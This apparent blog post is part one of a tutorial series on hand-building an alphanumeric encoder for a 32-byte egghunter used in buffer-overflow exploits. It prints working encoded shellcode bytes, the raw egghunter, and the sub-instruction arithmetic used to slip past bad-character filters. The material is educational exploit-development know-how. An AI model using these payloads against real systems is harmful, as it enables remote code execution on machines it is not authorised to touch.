---
layout: article
title: Building an Alphanumeric Encoder Part 1 - The Manual Method
permalink: /page/building-an-alphanumeric-encoder-part-1
key: page-article-header-overlay-background-image-HB
cover: /assets/images/thumbs/alphanumeric-encoder-part-1.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(15, 32, 39), rgb(44, 83, 100))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(15, 32, 39, .6), rgba(44, 83, 100, .6))'
    src: /assets/images/posts/alphanumeric-encoder-part-1/cover.png
---

Exploring the building blocks of a custom alphanumeric egghunter encoder.

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>

## Objective
This is the first post of a multi-part series exploring the process of creating a custom alphanumeric egghunter encoder. In Part 1, we consider a situation where such a need might arise and how one could go about encoding shellcode manually. We then break the problem down into its individual components and create an outline of the process necessary to automate the alphanumeric encoding process.



## Scenario
### Bad Characters in Exploits
In the security world, we occasionally run into situations where we have an exploitable <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank">buffer overflow</a> in a program that allows us to write arbitrary commands into executable memory locations. Attackers will have the program run these commands by sending input specifically designed to trigger the overflow vulnerability and redirect the program counter to point to malicious code.

Depending on the application, an attacker may encounter "bad characters" which they cannot include in their exploit. That is to say, they are limited to what instructions or characters they can use in their input due to the way the vulnerable application processes these characters. As an example, a vulnerable email server may have an exploitable buffer overflow in the the password field of a login prompt that does not enforce bounds checking. In order to take advantage of the vulnerability, an attacker would have to send input of a certain length in the password field to overwrite parts of memory that control program execution. Using specially crafted input, the program counter can be redirected to malicious code. However, since the password prompt is designed to digest passwords and not arbitrary commands, characters such as the null byte (<b>0x00</b>) or carriage return (<b>0x0d</b>), both of which often signal the end of user input, will cause all input sent after these characters to disappear or be malformed in memory, rendering the remaining parts of the buffer unusable for attack.

Depending on the program and specific attack vector, the list of characters that might mangle an attacker's input can be sizable (think character restrictions for filenames in programs capable of opening files). At times, the list of "good characters" is too restrictive for the attacker to execute commands they originally intended to send. This factor may make a vulnerability impossible or at the very least, extremely difficult to take advantage of. There was fun <a href="https://www.youtube.com/watch?v=gHISpAZiAm0" target = "_blank">presentation</a> given at DEFCON 16 by Mati Aharoni of Offensive Security describing a bug in the HP NNM suite that took a great deal of creativity to exploit, partially due to a highly restrictive character set. 

### The Alphanumeric Approach
<a href="https://en.wikipedia.org/wiki/Alphanumeric_shellcode" target = "_blank">Alphanumeric shellcode</a> is a flavor of shellcode that is either written directly or encoded in ASCII or Unicode characters. This type of shellcode has a higher chance of bypassing text filters in vulnerable functions meant only to digest strings. Another advantage to using alphanumeric characters is that the exploit is more likely to be portable across different systems.

Later in this series, we will be working with a vulnerable application that does not naturally have such a restricted character set, but for demonstration purposes, we assume that it does.



## Manual Encoding
The generous contributors of Corelan have done a great job of breaking down the manual alphanumeric encoding process in a post about <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target = "_blank">egghunters</a>. The post is inspired by Mati Aharoni's presentation given at DEFCON 16 mentioned above. For some background, we will briefly go over the manual encoding technique below before moving onto an automated solution.

Suppose we have just discovered a buffer overflow vulnerability in an application that allowed us to overwrite the program counter and redirect execution to our custom code. Unfortunately due to the way the application handles our input, we only have limited space to work with, say maybe 500 bytes to fit our shellcode in. Normally, this amount of space might be sufficient to allow us to gain remote access to the machine as most typical reverse or bind shells will be around 400 bytes in raw form. In this hypothetical scenario, however, bad characters are causing our shellcode to become mangled in memory. This forces us to use an encoder that builds our shellcode out of a set of good characters. While out-of-the-box encoders may solve our issue in some situations, encoding shellcode will usually increase the shellcode length by a substantial amount. In this situation, if our shellcode grows any larger, we won't be able to fit it into our buffer. So how do we go about solving this issue? 

Some buffer overflow vulnerabilities will allow the attacker to append additional input in a different part of the buffer, far removed from the original program counter overwrite. In these situations, egghunters are typically executed to search in memory for the far-removed shellcode by using a specific tag to identify the malicious code. The egghunter then proceeds to execute whatever instructions follow that tag. But in our scenario, the character set is so limited, that even a small, 32-byte egghunter in its raw form includes a couple of bad characters that cause it to become mangled in memory. Encoding instructions with a highly restrictive character set will significantly increase the space required to fit them in memory. However, since egghunters are typically small to begin with, we may still be able to fit an encoded version in our buffer, despite a large set of bad characters. The following paragraphs briefly touch upon an alphanumeric encoding technique designed to bypass such a scenario.



### The Encoded Egghunter

In the Corelan egghunter post mentioned above, the team guides readers through the process of using an egghunter to exploit a vulnerability in <a href="https://www.exploit-db.com/exploits/10235" _target="blank">Eureka Email Client v2.2</a>.

The encoded form of the egghunter used in the tutorial functions as follows:

1. Adjust <b>esp</b> to point to a desired location accessible to our program counter
2. Zero out <b>eax</b>
3. Using a series of three subtract operations, reproduce 4 bytes of the decoded egghunter and store in <b>eax</b>
4. Push <b>eax</b> (which holds 4 bytes of the decoded egghunter) onto stack
5. Repeat steps 2-4 until all bytes of egghunter have been pushed onto stack

After the shellcode above finishes pushing the decoded egghunter onto the stack, we assume from Step 1 that our program counter has access to the egghunter and can proceed to execute the decoded instructions. <i>Note: Throughout this series, I will refer to the loop above as the "encoded egghunter" for simplicity's sake even though the loop really just contains instructions to push a raw egghunter onto the stack.</i>

A Python version of the encoded egghunter might look something like this:

```py
#w00t tag
egghunter = ""
#\x61 = popad - to make ESP point below the encoded hunter
egghunter += "\x61\x61\x61\x61\x61\x61\x61\x61"
#-----8 blocks encoded hunter---------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x30\x71\x55\x71"     #x75 xE7 xFF xE7
egghunter += "\x2d\x30\x71\x55\x71"
egghunter += "\x2d\x2B\x36\x55\x35"
egghunter += "\x50"                     #push eax
#--------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x71\x30\x71\x71"     #xAF x75 xEA xAF
egghunter += "\x2d\x71\x30\x71\x71"
egghunter += "\x2d\x6F\x29\x33\x6D"
egghunter += "\x50"                     #push eax
#--------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x50\x30\x25\x65"     #x30 x74 x8B xFA
egghunter += "\x2d\x50\x30\x25\x65"
egghunter += "\x2d\x30\x2B\x2A\x3B"
egghunter += "\x50"                     #push eax
#---------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x71\x71\x30\x41"     #xEF xB8 x77 x30
egghunter += "\x2d\x71\x71\x30\x41"
egghunter += "\x2d\x2F\x64\x27\x4d"
egghunter += "\x50"                     #push eax
#---------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x42\x53\x30\x30"     #x3C x05 x5A x74
egghunter += "\x2d\x41\x53\x30\x30"
egghunter += "\x2d\x41\x54\x45\x2B"
egghunter += "\x50"                     #push eax
#---------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x54\x30\x66\x46"     #x02 x58 xCD x2E
egghunter += "\x2d\x55\x30\x66\x46"
egghunter += "\x2d\x55\x47\x66\x44"
egghunter += "\x50"                     #push eax
#---------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x50\x3e\x39\x31"     #x0F x42 x52 x6A
egghunter += "\x2d\x50\x3e\x39\x32"
egghunter += "\x2d\x51\x41\x3b\x32"
egghunter += "\x50"                     #push eax
#----------------------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x33\x35\x70\x55"     #x66 x81 xCA xFF
egghunter += "\x2d\x33\x25\x70\x55"
egghunter += "\x2d\x34\x24\x55\x55"
egghunter += "\x50"                     #push eax
#------------------------------
egghunter += "\x41\x41\x41\x41"         #some nops
```

The code begins with eight <b>popad</b> instructions that align ESP to point to a memory address that is higher than the end of the encoded stub itself. 

<img src="/assets/images/posts/alphanumeric-encoder-part-1/01.png" alt="" class="center">

As you can see, before execution of the <b>popad</b> instructions, <b>esp</b> points to <b>0012cd6c</b>. If we push instructions onto the stack at this address, we will be writing our egghunter to memory towards lower addressess since the stack grows towards <b>00000000</b>. When the stub finishes pushing our egghunter, the program counter will continue incrementing its address (growing towards higher memory) and thus will never actually end up executing the egghunter. To remedy this problem, we've prepended the <b>popad</b>s to the egghunter.

<img src="/assets/images/posts/alphanumeric-encoder-part-1/02.png" alt="" class="center">

After our <b>popad</b> instructions, ESP now points to <b>0012ce6c</b>. If we push the decoded egghunter onto the stack at this location, we will begin writing to lower addresses starting from the last null byte highlighted below. The final egghunter will take up 32 bytes of space. Once the encoded stub finishes, the program counter will continue executing instructions and incrementing its address until it hits the first instruction of our egghunter. From there, our egghunter will be executed and the program will begin searching memory for the tag-appended shellcode we have stored somewhere else in our buffer. Below, we can see the decoded egghunter in memory beginning at an address that the program counter will naturally reach.

<img src="/assets/images/posts/alphanumeric-encoder-part-1/03.png" alt="" class="center">

Let's analyze what's happening in each of these individual blocks of our encoded egghunter.

```py
#-----First block encoded hunter---------------
egghunter += "\x25\x4A\x4D\x4E\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x30\x71\x55\x71"     #x75 xE7 xFF xE7
egghunter += "\x2d\x30\x71\x55\x71"
egghunter += "\x2d\x2B\x36\x55\x35"
egghunter += "\x50"                     #push eax
```

The first two instructions of each block are static and translate to <code>and eax, 554e4d4a</code> and <code>and eax, 2a313235</code>. These instructions act to clear out the <b>eax</b> register. Performed on any value stored in <b>eax</b>, the pair of logical <code>and</code>s will always result in <b>00000000</b>. Now that <b>eax</b> is cleared, we can store 4 bytes of our shellcode using a series of three <code>sub</code> instructions. We will build our operands using characters between <b>\x21</b> and <b>\x7e</b>, our <b>ASCII-printable</b> characters. While not necessary for this particular exploit, some functions of vulnerable applications may treat characters outside of this range as bad characters. Some applications (HP NNM 7.5.1 from the DEFCON 16 talk) may be even more restrictive in their character sets, forcing the attacker to exclude characters within the ASCII-printable range.

In the first encoded hunter block, after <code>eax</code> is cleared, our <code>sub</code> operands are:

```py
#\x75\xE7\xFF\xE7 is pushed onto the stack
egghunter += "\x2d\x30\x71\x55\x71"     # sub eax, 0x71557130
egghunter += "\x2d\x30\x71\x55\x71"     # sub eax, 0x71557130
egghunter += "\x2d\x2B\x36\x55\x35"     # sub eax, 0x3555362B
```
0x00000000 - 0x71557130 - 0x71557130 - 0x3555362B = <b>0xE7FFE775</b>

Observe that that the value above corresponds to the last 4 bytes of our egghunter when written into memory in little-endian format:

```
#NtAccessCheckAndAuditAlarm egghunter
#using w00t ("\x77\x30\x30\x74") tag

\x66\x81\xCA\xFF
\x0F\x42\x52\x6A
\x02\x58\xCD\x2E
\x3C\x05\x5A\x74
\xEF\xB8\x77\x30
\x30\x74\x8B\xFA
\xAF\x75\xEA\xAF
\x75\xE7\xFF\xE7    <===
```

Once <code>eax</code> has been loaded with our desired 4 bytes, the final <b>\x50</b> of the encoded block pushes the value stored in <code>eax</code> onto the stack. Each block will push another 4 bytes of our egghunter until all bytes of the egghunter are stored on the stack.



### Manual Encoding

So how do we come up hex values that comprise the three <code>sub</code> instructions in our encoded blocks?

The method is as follows:

1. Organize the egghunter into 4 byte chunks

2. Pad the instructions to a multiple of 4 with "safe instructions" if necessary:<br>
   In our situation, 32 bytes will not need any padding. If we had, say, 30 bytes in our egghunter, we would need to pad two ASCII-printable bytes of an instruction that would not cause any adverse side effects to the rest of our code. For example, if we did not have any use for the <code>ecx</code> register, we could use <code>inc ecx</code> or <b>\x41</b> to pad out our egghunter.

3. Take last 4 byte chunk and format in little-endian:<br>
  <b>\x75\xE7\xFF\xE7</b> ==> <b>\xE7\xFF\xE7\x75</b>

4. Take the two's complement of the result:<br>
  <b>0xE7FFE775</b> ==> <b>0x1800188B</b><br>
  This can be done in calc.exe in Programmer Mode by negating the operand.

5. Find three ASCII-printable operands that, when subtracted from zero, result in the two's complement calculated in the previous step.<br>

   The Corelan <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" _target="blank">tutorial</a> does a great job of explaining this part. Here, I am just regurgitating the steps as taught by the author.  
   <br>
   Two's complement: <b>0x1800188B</b>  
   <br>
   Take the first byte <b>0x18</b>, which we will call our dividend, and find three ASCII-printable values that will add up to this value. The method commonly used is to simply divide the dividend by three. If the three divisors, <b>0x06</b> in this case, fall out of the range of ASCII-printable characters (less than <b>0x20</b>), add <b>0x100</b> to the dividend and try again.
   <br>
   Divisor (<b>0x06</b>) below ASCII-printable lower bound (<b>0x20</b>) so <b>0x100</b> + <b>0x18</b> = <b>0x118</b>.  
   <br>
   Byte 0x18: <b>0x118</b> / <b>0x3</b> = <b>0x5d</b> with remainder <b>0x1</b><br><br> 
   Normally, we would have to keep track of this carry from the extra <b>0x100</b>, but this is the most significant byte, so the carry will be truncated. The result, <b>0x5d</b>, will now be the most significant byte of the three <code>sub</code> operands we are looking for (before adjustment):
   <br><br>
   Operand 1: 0x<b>5d</b>??????<br>
   Operand 2: 0x<b>5d</b>??????<br>
   Operand 3: 0x<b>5d</b>??????
   <br><br>
   Repeat steps for the next three bytes. Keep track of carries and remainders.
   <br>
   Byte 0x00: <b>0x100</b> / <b>0x3</b> = <b>0x55</b> with remainder <b>0x1</b>, carry
   <br><br>
   Operand 1: 0x5d<b>55</b>????<br>
   Operand 2: 0x5d<b>55</b>????<br>
   Operand 3: 0x5d<b>55</b>????
   <br><br>
   Byte 0x18: <b>0x118</b> / <b>0x3</b> = <b>0x5d</b> with remainder <b>0x1</b>, carry
   <br><br>
   Operand 1: 0x5d55<b>5d</b>??<br>
   Operand 2: 0x5d55<b>5d</b>??<br>
   Operand 3: 0x5d55<b>5d</b>??
   <br><br>
   Byte 0x8b: <b>0x8b</b> / <b>0x3</b> = <b>0x2e</b> with remainder <b>0x1</b>, no carry
   <br><br>
   Operand 1: 0x5d555d<b>2e</b><br>
   Operand 2: 0x5d555d<b>2e</b><br>
   Operand 3: 0x5d555d<b>2e</b>
   <br><br>
   Now we have to adjust for remainders and carries. For each carry, we subtract <b>0x1</b> from <i>one operand</i> in the immediate, more significant byte column. For each remainder, we add <b>0x1</b> to <i>one operand</i> in the same byte column that produced the remainder. It is best to start at the least significant byte column. After adjusting our operands, we obtain the results below:
   <br><br>
   Operand 1: 0x5d555e2f<br>
   Operand 2: 0x5d555d2e<br>
   Operand 3: 0x5d555d2e
   <br><br>
   Sometimes, we will find that our carries and remainders cancel each other out as they did in the two most significant bytes for our operands above.
   <br><br>
   Now, notice: 0x00000000 - 0x5d555e2f - 0x5d555d2e - 0x5d555d2e = <b>0xe7ffe775</b>

We have officially generated our first block's three <code>sub</code> operands. Below, the operations are shown on the left and the op codes on the right. <b>\x2d</b> is the op code for <code>sub</code> and the hex values will need to be loaded in little-endian format.

<code>sub 0x5d555e2f</code> == <b>\x2d\x2f\x5e\x55\x5d</b><br>
<code>sub 0x5d555d2e</code> == <b>\x2d\x2e\x5d\x55\x5d</b><br>
<code>sub 0x5d555d2e</code> == <b>\x2d\x2e\x5d\x55\x5d</b>

If we include the op codes for clearing <code>eax</code> and pushing <code>eax</code> onto the stack, our first encoded egghunter block will look like the following code:

```py
#-----First block encoded hunter---------------
egghunter += "\x25\x4a\x4d\x4e\x55"     #zero eax
egghunter += "\x25\x35\x32\x31\x2A"     #
egghunter += "\x2d\x2f\x5e\x55\x5d"     #x75 xE7 xFF xE7
egghunter += "\x2d\x2e\x5d\x55\x5d"
egghunter += "\x2d\x2e\x5d\x55\x5d"
egghunter += "\x50"                     #push eax
```

While this block contains different <code>sub</code> operands than the first block of the encoded hunter shown previously, they both push the values <b>"\x75\xe7\xff\xe7"</b> onto the stack. As long as our good character set isn't too restrictive, there are likely to be many different operands that will produce the four bytes we desire.


## An Automated Solution

By breaking down the manual encoding process into five steps, we've mapped out the general flow of our desired program. We can take these five steps and separate them into one or multiple functions to build a tool that will automate the process for us. Our plan is to:

1. Take the raw egghunter as user input

2. Pad the instructions to a multiple of 4

3. Split the egghunter into 4 byte chunks

4. Reverse the order of the 4 byte chunks (we need to push the egghunter onto the stack starting from end -> beginning) 

5. Encoding Loop:<br>
   * Point at the first 4 byte chunk (after reversing the chunk order)<br>
   * Take the two’s complement<br>
   * Generate a <a href="https://en.wikipedia.org/wiki/Partition_(number_theory)" _target="blank">partition</a> containing three operands comprised only of good characters<br>
   * Store operands<br>
   * Increment four bytes<br>
   * If we have not hit the end, loop back to second bullet.<br>

6. Print Loop:<br>
   * Block begins with op codes for <code>zero eax</code>:<br>
     * <b>\x25\x4a\x4d\x4e\x55</b><br>
     * <b>\x25\x35\x32\x31\x2a</b><br> 
   * For three consecutive operands:<br>
     * Append <b>\x2d</b> to operand  <br>
     * Print operand  <br>
   * Block ends with op code for <code>push eax</code><br>
   * If more operands left, loop back to step 6a.


In Part 2 of this series, we'll go on to explore how we can use functions that generate integer partitions to help us automate the encoding process. 